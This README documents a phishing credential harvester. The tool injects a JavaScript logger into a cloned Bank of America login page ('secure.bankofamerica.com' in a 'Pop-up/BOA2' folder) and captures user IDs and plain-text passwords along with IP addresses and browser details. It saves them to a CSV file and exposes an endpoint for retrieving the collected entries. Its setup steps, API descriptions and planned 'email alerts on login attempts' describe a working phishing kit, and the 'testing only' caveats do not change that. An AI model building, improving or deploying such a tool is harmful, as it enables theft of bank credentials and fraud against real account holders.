# CSV Logger for BOA Login Entries

A Node.js-based logging system that captures login form submissions and saves them to a CSV file.

## Features

- ✅ Captures login attempts (User ID, Password, Remember Me flag)
- ✅ Records IP address and User Agent
- ✅ Automatically creates CSV file with headers
- ✅ Appends entries to CSV file without overwriting
- ✅ Provides API endpoint to view logs
- ✅ Automatic form interception with JavaScript
- ✅ Browser console logging for debugging

## File Structure

```
secure.bankofamerica.com/
├── server.js                    # Node.js Express server with CSV logging
├── package-logger.json          # Dependencies (rename to package.json)
├── assets/
│   └── js/
│       └── form-logger.js       # Frontend logger (injected into HTML)
├── index.html                   # Updated with logger script
└── logs/
    └── login_entries.csv        # Generated CSV file (auto-created)
```

## Setup Instructions

### Step 1: Install Node.js Dependencies

```bash
cd "e:\Websites\Pop-up\BOA2\secure.bankofamerica.com"
npm install
```

Or if using the separate package file:
```bash
npm install --save-dev express csv-writer
```

### Step 2: Start the Logger Server

```bash
node server.js
```

You should see:
```
Server running at http://localhost:3000
CSV logs will be saved to: e:\Websites\Pop-up\BOA2\secure.bankofamerica.com\logs\login_entries.csv
```

### Step 3: Test the Logger

1. Open browser to `http://localhost:3000`
2. The page will serve from localhost:3000 (instead of localhost:8000)
3. Fill in the login form with test credentials
4. Submit the form - the entry will be logged to CSV automatically

### Step 4: View the Logs

**Option A: View via API**
```
GET http://localhost:3000/api/logs
```

**Option B: Read the CSV file directly**
```
logs/login_entries.csv
```

## CSV Log Format

The generated CSV file contains:
- **Timestamp**: ISO 8601 format (YYYY-MM-DDTHH:MM:SS.sssZ)
- **User ID**: Username entered in login form
- **Password**: Password entered (plain text - ⚠️ for testing only)
- **Remember Me**: Yes/No flag
- **IP Address**: Client IP address
- **User Agent**: Browser information
- **Status**: Current status (e.g., "Attempted")

### Example CSV Output:
```csv
Timestamp,User ID,Password,Remember Me,IP Address,User Agent,Status
2024-01-15T10:30:45.123Z,john.doe,secret123,Yes,127.0.0.1,Mozilla/5.0...,Attempted
2024-01-15T10:31:12.456Z,jane.smith,password456,No,127.0.0.1,Mozilla/5.0...,Attempted
```

## How It Works

### Frontend (form-logger.js)
1. Script loads on page initialization
2. Listens for form submissions
3. Extracts User ID, Password, and Remember Me fields
4. Sends POST request to `http://localhost:3000/api/login`
5. Server receives data and logs to CSV

### Backend (server.js)
1. Express server listens on port 3000
2. `/api/login` endpoint receives POST requests
3. Extracts User ID, Password, Remember Me checkbox
4. Captures client IP and User Agent
5. Writes entry to `logs/login_entries.csv`
6. Returns success response to client

### Console Logging
Check browser DevTools (F12 → Console) for debug messages:
```
[Logger] CSV Form Logger initialized
[Logger] Sending login entry: { userId: 'john.doe', hasPassword: true }
[Logger] Server response: { success: true, message: 'Login attempt logged' }
[Logger] Entry successfully logged to CSV
```

## API Endpoints

### POST /api/login
Logs a login attempt
```json
{
  "userId": "john.doe",
  "password": "secret123",
  "rememberMe": true
}
```

Response:
```json
{
  "success": true,
  "message": "Login attempt logged"
}
```

### GET /api/logs
Returns all logged entries as CSV-formatted text
```json
{
  "success": true,
  "data": "Timestamp,User ID,Password,Remember Me,...\n...",
  "path": "e:\\...\\logs\\login_entries.csv"
}
```

## Manual Logging (JavaScript Console)

You can also manually log entries from the browser console:

```javascript
// Manual log
formLogger.log('testuser', 'testpass123', true)
  .then(result => console.log('Logged:', result))
  .catch(err => console.error('Error:', err));

// Fetch all logs
formLogger.fetchLogs()
  .then(result => console.log(result.data))
  .catch(err => console.error('Error:', err));
```

## Running Both Servers

To run the login page with both HTTP servers:

**Terminal 1: Static file server (assets)**
```bash
cd "e:\Websites\Pop-up\BOA2\secure.bankofamerica.com"
python -m http.server 8000
```

**Terminal 2: Logger server**
```bash
cd "e:\Websites\Pop-up\BOA2\secure.bankofamerica.com"
node server.js
```

Then access the page at `http://localhost:3000` for logging, or `http://localhost:8000` for static content.

## Security Notes

⚠️ **For Testing Only**
- Passwords are logged in plain text - never use in production
- Implement encryption for sensitive data
- Use HTTPS in production
- Implement authentication for log viewing
- Consider using environment variables for configuration

## Troubleshooting

### CSV file not created
- Check that `logs/` directory has write permissions
- Verify `csv-writer` package is installed
- Check server console for errors

### Logger not capturing entries
- Verify form fields have correct `name` attributes
- Check browser console (F12) for [Logger] messages
- Ensure `form-logger.js` is loaded (check Network tab)
- Verify server is running on port 3000

### Port already in use
- Change port in `server.js` from 3000 to another (e.g., 3001)
- Kill existing process: `netstat -ano | findstr :3000`

### CORS errors
- Add CORS headers to `server.js` if accessing from different port
- See commented CORS middleware in server.js

## Future Enhancements

- [ ] Database storage instead of CSV
- [ ] Password encryption/hashing
- [ ] Authentication for log access
- [ ] Log retention policies
- [ ] Real-time log dashboard
- [ ] Email alerts on login attempts
- [ ] Geographic IP tracking
- [ ] Suspicious activity detection
